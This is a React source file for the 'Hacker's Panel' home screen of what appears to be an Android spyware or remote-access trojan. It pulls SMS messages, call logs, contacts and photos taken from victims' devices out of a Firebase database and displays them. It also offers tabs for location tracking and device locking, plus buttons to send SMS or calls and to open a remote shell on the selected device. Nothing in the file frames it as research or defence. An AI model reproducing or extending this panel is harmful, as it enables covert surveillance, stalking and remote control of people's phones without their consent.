import React, { useState, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import {
  ref,
  onValue,
  query,
  orderByChild,
  limitToLast,
} from "firebase/database";
import {
  getStorage,
  ref as storageRef,
  getDownloadURL,
} from "firebase/storage";
import SmsItem from "./SmsItem";
import AllSmsTab from "./AllSmsTab";
import AllData from "./AllData";
import AllCallsTab from "./AllCallsTab";
import AllContactsTab from "./AllContactsTab";
import ImagesTab from "./ImagesTab";
import LocationTrackerTab from "./LocationTrackerTab";
import LockServiceTab from "./LockServiceTab";
import "./HomeScreen.css";

const formatPhoneNumber = (number) => {
  if (!number || typeof number !== "string") return "Unknown";
  const cleaned = number.replace(/\D/g, "");
  if (cleaned.length === 10) {
    return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(
      6
    )}`;
  }
  return number;
};

const formatDate = (timestamp) => {
  if (typeof timestamp === "number") {
    return new Date(timestamp).toLocaleString("en-US", {
      dateStyle: "short",
      timeStyle: "short",
    });
  }
  if (timestamp && timestamp.toDate) {
    return timestamp.toDate().toLocaleString("en-US", {
      dateStyle: "short",
      timeStyle: "short",
    });
  }
  if (typeof timestamp === "string" && !isNaN(Number(timestamp))) {
    return new Date(Number(timestamp)).toLocaleString("en-US", {
      dateStyle: "short",
      timeStyle: "short",
    });
  }
  return "Invalid date";
};

const formatDuration = (seconds) => {
  const mins = Math.floor(seconds / 60);
  const secs = Math.floor(seconds % 60);
  return `${mins}m ${secs}s`;
};

const HomeScreen = ({
  devices,
  selectedDevice,
  setSelectedDevice,
  database,
}) => {
  const [smsMessages, setSmsMessages] = useState([]);
  const [callLogs, setCallLogs] = useState([]);
  const [contacts, setContacts] = useState([]);
  const [images, setImages] = useState([]);
  const [activeTab, setActiveTab] = useState("home");
  const [isLoading, setIsLoading] = useState({
    sms: false,
    calls: false,
    contacts: false,
    images: false,
  });
  const [error, setError] = useState(null);
  const [activeCallId, setActiveCallId] = useState(null);
  const [activeContactId, setActiveContactId] = useState(null);
  const [activeImageId, setActiveImageId] = useState(null);
  const [imageUrls, setImageUrls] = useState({});

  const navigate = useNavigate();
  const storage = getStorage();

  const fetchSmsMessages = useCallback(
    (deviceId) => {
      setIsLoading((prev) => ({ ...prev, sms: true }));
      const smsRef = ref(database, `Device/${deviceId}/sms`);
      const unsubscribe = onValue(
        smsRef,
        (snapshot) => {
          setIsLoading((prev) => ({ ...prev, sms: false }));
          if (snapshot.exists()) {
            const messages = [];
            snapshot.forEach((sms) => {
              const smsData = sms.val();
              messages.push({
                id: sms.key,
                sender: smsData.sender || "Unknown",
                message: smsData.message || "No message content",
                timestamp: smsData.timestamp || Date.now(),
                deviceId,
              });
            });
            messages.sort((a, b) => b.timestamp - a.timestamp);
            setSmsMessages(messages.slice(0, 5));
          } else {
            setSmsMessages([]);
          }
        },
        (error) => {
          setIsLoading((prev) => ({ ...prev, sms: false }));
          setError("Failed to load SMS messages.");
          console.error("Error fetching SMS messages:", error);
        }
      );
      return () => unsubscribe();
    },
    [database]
  );

  const fetchCallLogs = useCallback(
    (deviceId) => {
      setIsLoading((prev) => ({ ...prev, calls: true }));
      const callsRef = ref(database, `Device/${deviceId}/calls/data`);
      const callsQuery = query(callsRef, orderByChild("date"), limitToLast(5));
      const unsubscribe = onValue(
        callsQuery,
        (snapshot) => {
          setIsLoading((prev) => ({ ...prev, calls: false }));
          if (snapshot.exists()) {
            const callsData = [];
            snapshot.forEach((childSnapshot) => {
              callsData.push({
                id: childSnapshot.key,
                ...childSnapshot.val(),
              });
            });
            callsData.sort((a, b) => (b.date || 0) - (a.date || 0));
            setCallLogs(callsData);
          } else {
            setCallLogs([]);
          }
        },
        (error) => {
          setIsLoading((prev) => ({ ...prev, calls: false }));
          setError("Failed to load call logs.");
          console.error("Error fetching call logs:", error);
        }
      );
      return () => unsubscribe();
    },
    [database]
  );

  const fetchContacts = useCallback(
    (deviceId) => {
      setIsLoading((prev) => ({ ...prev, contacts: true }));
      const contactsRef = ref(database, `Device/${deviceId}/contacts/data`);
      const contactsQuery = query(
        contactsRef,
        orderByChild("lastContacted"),
        limitToLast(5)
      );
      const unsubscribe = onValue(
        contactsQuery,
        (snapshot) => {
          setIsLoading((prev) => ({ ...prev, contacts: false }));
          if (snapshot.exists()) {
            const contactsData = [];
            snapshot.forEach((childSnapshot) => {
              contactsData.push({
                id: childSnapshot.key,
                ...childSnapshot.val(),
              });
            });
            contactsData.sort(
              (a, b) => (b.lastContacted || 0) - (a.lastContacted || 0)
            );
            setContacts(contactsData);
          } else {
            setContacts([]);
          }
        },
        (error) => {
          setIsLoading((prev) => ({ ...prev, contacts: false }));
          setError("Failed to load contacts.");
          console.error("Error fetching contacts:", error);
        }
      );
      return () => unsubscribe();
    },
    [database]
  );

  const fetchImages = useCallback(
    (deviceId) => {
      setIsLoading((prev) => ({ ...prev, images: true }));
      const imagesRef = ref(database, `Device/${deviceId}/images/data`);
      const imagesQuery = query(
        imagesRef,
        orderByChild("dateTaken"),
        limitToLast(5)
      );
      const unsubscribe = onValue(
        imagesQuery,
        (snapshot) => {
          setIsLoading((prev) => ({ ...prev, images: false }));
          if (snapshot.exists()) {
            const imagesData = [];
            snapshot.forEach((childSnapshot) => {
              imagesData.push({
                id: childSnapshot.key,
                ...childSnapshot.val(),
              });
            });
            imagesData.sort((a, b) => (b.dateTaken || 0) - (a.dateTaken || 0));
            setImages(imagesData);

            imagesData.forEach(async (image) => {
              if (image.storagePath) {
                try {
                  const url = await getDownloadURL(
                    storageRef(storage, image.storagePath)
                  );
                  setImageUrls((prev) => ({ ...prev, [image.id]: url }));
                } catch (err) {
                  console.warn(
                    `Failed to fetch URL for ${image.storagePath}: ${err.message}`
                  );
                  setImageUrls((prev) => ({ ...prev, [image.id]: null }));
                }
              }
            });
          } else {
            setImages([]);
            setImageUrls({});
          }
        },
        (error) => {
          setIsLoading((prev) => ({ ...prev, images: false }));
          setError("Failed to load images.");
          console.error("Error fetching images:", error);
        }
      );
      return () => unsubscribe();
    },
    [database, storage]
  );

  useEffect(() => {
    // Automatically select the first device if none is selected and devices exist
    if (!selectedDevice && devices.length > 0) {
      setSelectedDevice(devices[0]);
    }

    if (selectedDevice) {
      fetchSmsMessages(selectedDevice);
      fetchCallLogs(selectedDevice);
      fetchContacts(selectedDevice);
      fetchImages(selectedDevice);
      setError(null);
    } else if (devices.length === 0) {
      setSmsMessages([]);
      setCallLogs([]);
      setContacts([]);
      setImages([]);
      setImageUrls({});
      setError("No devices available.");
    }
  }, [
    selectedDevice,
    devices,
    setSelectedDevice,
    database,
    fetchSmsMessages,
    fetchCallLogs,
    fetchContacts,
    fetchImages,
  ]);

  const handleDeviceChange = (e) => {
    const newDevice = e.target.value;
    setSelectedDevice(newDevice);
    setError(newDevice ? null : "Please select a device.");
  };

  const goToSendSms = () => {
    if (selectedDevice) {
      navigate("/send-sms", { state: { selectedDevice } });
    }
  };

  const goToTerminal = () => {
    if (selectedDevice) {
      navigate("/terminal", { state: { selectedDevice } });
    }
  };

  const handleTabClick = (tab) => {
    setActiveTab(tab);
    setError(null);
  };

  const toggleCallDetails = (callId) => {
    setActiveCallId(activeCallId === callId ? null : callId);
  };

  const toggleContactDetails = (contactId) => {
    setActiveContactId(activeContactId === contactId ? null : contactId);
  };

  const toggleImageDetails = (imageId) => {
    setActiveImageId(activeImageId === imageId ? null : imageId);
  };

  const getCallTypeIcon = (type) => {
    switch (type) {
      case "Outgoing":
        return "→";
      case "Incoming":
        return "←";
      case "Missed":
        return "✗";
      case "Rejected":
        return "✘";
      case "Voicemail":
        return "✉";
      default:
        return "?";
    }
  };

  return (
    <div className="home-screen">
      <h1>Hacker's Panel</h1>
      {error && <div className="error-message">{error}</div>}
      <div className="device-header">
        <div>Selected Device: {selectedDevice || "None"}</div>
      </div>

      <div className="tabs">
        {[
          "home",
          "allSms",
          "allData",
          "allCalls",
          "allContacts",
          "images",
          "location",
          "lockService",
        ].map((tab) => (
          <div
            key={tab}
            className={`tab ${activeTab === tab ? "active" : ""}`}
            onClick={() => handleTabClick(tab)}
          >
            {tab === "home"
              ? "Home"
              : tab === "allSms"
              ? "SMS"
              : tab === "allData"
              ? "Data"
              : tab === "allCalls"
              ? "Calls"
              : tab === "allContacts"
              ? "Contacts"
              : tab === "images"
              ? "Images"
              : tab === "location"
              ? "Location"
              : "Lock"}
          </div>
        ))}
      </div>

      {activeTab === "home" ? (
        <div className="home-tab-content">
          <div className="device-controls">
            {devices.length === 0 ? (
              <div className="empty-message">No devices available.</div>
            ) : (
              <select
                value={selectedDevice || ""}
                onChange={handleDeviceChange}
                className="device-select"
              >
                <option value="" disabled>
                  Select a Device
                </option>
                {devices.map((device) => (
                  <option key={device} value={device}>
                    {device}
                  </option>
                ))}
              </select>
            )}

            <div className="buttons-container">
              <button
                className={`send-sms-btn ${selectedDevice ? "active" : ""}`}
                onClick={goToSendSms}
                disabled={!selectedDevice}
              >
                CALL/SMS
              </button>
              <button
                className={`shell-btn ${selectedDevice ? "active" : ""}`}
                onClick={goToTerminal}
                disabled={!selectedDevice}
              >
                Shell
              </button>
            </div>
          </div>

          <div className="sms-list">
            <h2>SMS Messages</h2>
            {isLoading.sms ? (
              <div className="loading-message">
                <div className="loading"></div> Loading SMS...
              </div>
            ) : selectedDevice ? (
              smsMessages.length > 0 ? (
                smsMessages.map((msg) => (
                  <SmsItem key={msg.id} message={msg} showDeviceTag={false} />
                ))
              ) : (
                <div className="empty-message">
                  No SMS messages found for this device.
                </div>
              )
            ) : (
              <div className="empty-message">
                Select a device to load SMS messages...
              </div>
            )}
          </div>

          <div className="call-list">
            <h2>Recent Calls</h2>
            {isLoading.calls ? (
              <div className="loading-message">
                <div className="loading"></div> Loading calls...
              </div>
            ) : selectedDevice ? (
              callLogs.length > 0 ? (
                callLogs.map((call) => (
                  <div
                    key={call.id}
                    className="call-item"
                    onClick={() => toggleCallDetails(call.id)}
                  >
                    <div className="call-summary">
                      <span className="call-type">
                        {getCallTypeIcon(call.type)} {call.type}
                      </span>
                      <span className="call-number">
                        {formatPhoneNumber(call.number)}
                      </span>
                      <span className="call-date">{formatDate(call.date)}</span>
                      <span className="call-duration">
                        {formatDuration(call.duration)}
                      </span>
                      <span className="expand-indicator">
                        {activeCallId === call.id ? "▼" : "▶"}
                      </span>
                    </div>
                    {activeCallId === call.id && (
                      <div className="call-details">
                        <div>Number: {formatPhoneNumber(call.number)}</div>
                        <div>Type: {call.type}</div>
                        <div>Date: {formatDate(call.date)}</div>
                        <div>Duration: {formatDuration(call.duration)}</div>
                        <div>
                          Upload Time:{" "}
                          {call.uploaded
                            ? formatDate(call.uploaded)
                            : "Unknown"}
                        </div>
                      </div>
                    )}
                  </div>
                ))
              ) : (
                <div className="empty-message">
                  No call logs found for this device.
                </div>
              )
            ) : (
              <div className="empty-message">
                Select a device to load call logs...
              </div>
            )}
          </div>

          <div className="contact-list">
            <h2>Recent Contacts</h2>
            {isLoading.contacts ? (
              <div className="loading-message">
                <div className="loading"></div> Loading contacts...
              </div>
            ) : selectedDevice ? (
              contacts.length > 0 ? (
                contacts.map((contact) => (
                  <div
                    key={contact.id}
                    className="contact-item"
                    onClick={() => toggleContactDetails(contact.id)}
                  >
                    <div className="contact-summary">
                      <span className="contact-name">
                        {contact.name || "Unknown"}
                      </span>
                      <span className="phone-count">
                        {contact.phoneNumbers?.length || 0} number
                        {contact.phoneNumbers?.length !== 1 ? "s" : ""}
                      </span>
                      <span className="expand-indicator">
                        {activeContactId === contact.id ? "▼" : "▶"}
                      </span>
                    </div>
                    {activeContactId === contact.id && (
                      <div className="contact-details">
                        <div>Name: {contact.name || "Unknown"}</div>
                        <div>
                          Phone Numbers:
                          {contact.phoneNumbers?.length > 0 ? (
                            <ul>
                              {contact.phoneNumbers.map((phone, index) => (
                                <li key={index}>
                                  {formatPhoneNumber(phone.number)} (
                                  {phone.type})
                                </li>
                              ))}
                            </ul>
                          ) : (
                            "No phone numbers"
                          )}
                        </div>
                        <div>
                          Upload Time:{" "}
                          {contact.uploaded
                            ? formatDate(contact.uploaded)
                            : "Unknown"}
                        </div>
                      </div>
                    )}
                  </div>
                ))
              ) : (
                <div className="empty-message">
                  No contacts found for this device.
                </div>
              )
            ) : (
              <div className="empty-message">
                Select a device to load contacts...
              </div>
            )}
          </div>

          <div className="image-list">
            <h2>Recent Images</h2>
            {isLoading.images ? (
              <div className="img-loading-message">
                <div className="img-loading"></div> Loading images...
              </div>
            ) : selectedDevice ? (
              images.length > 0 ? (
                images.map((image) => (
                  <div
                    key={image.id}
                    className="image-item"
                    onClick={() => toggleImageDetails(image.id)}
                  >
                    <div className="image-summary">
                      <span className="image-file-name">
                        {image.fileName || "Unknown"}
                      </span>
                      <span className="image-date-taken">
                        {image.dateTaken
                          ? formatDate(image.dateTaken)
                          : "Unknown"}
                      </span>
                      <span className="expand-indicator">
                        {activeImageId === image.id ? "▼" : "▶"}
                      </span>
                    </div>
                    {activeImageId === image.id && (
                      <div className="image-details">
                        {imageUrls[image.id] && (
                          <div className="image-preview">
                            <img
                              src={imageUrls[image.id]}
                              alt={image.fileName || "Image"}
                              style={{ maxWidth: "100px", maxHeight: "100px" }}
                            />
                          </div>
                        )}
                        <div>File Name: {image.fileName || "Unknown"}</div>
                        <div>
                          Date Taken:{" "}
                          {image.dateTaken
                            ? formatDate(image.dateTaken)
                            : "Unknown"}
                        </div>
                        <div>
                          Upload Time:{" "}
                          {image.uploaded
                            ? formatDate(image.uploaded)
                            : "Unknown"}
                        </div>
                        <div>
                          Storage Path:{" "}
                          {image.storagePath ? (
                            <a
                              href={imageUrls[image.id] || image.storagePath}
                              target="_blank"
                              rel="noopener noreferrer"
                            >
                              {image.storagePath}
                            </a>
                          ) : (
                            "Not available"
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                ))
              ) : (
                <div className="empty-message">
                  No images found for this device.
                </div>
              )
            ) : (
              <div className="empty-message">
                Select a device to load images...
              </div>
            )}
          </div>
        </div>
      ) : activeTab === "allSms" ? (
        <AllSmsTab devices={devices} database={database} />
      ) : activeTab === "allCalls" ? (
        <AllCallsTab
          devices={devices}
          selectedDevice={selectedDevice}
          setSelectedDevice={setSelectedDevice}
          database={database}
        />
      ) : activeTab === "allContacts" ? (
        <AllContactsTab devices={devices} database={database} />
      ) : activeTab === "images" ? (
        <ImagesTab devices={devices} database={database} />
      ) : activeTab === "location" ? (
        <LocationTrackerTab devices={devices} database={database} />
      ) : activeTab === "lockService" ? (
        <LockServiceTab devices={devices} database={database} />
      ) : (
        <AllData devices={devices} database={database} />
      )}
    </div>
  );
};

export default HomeScreen;
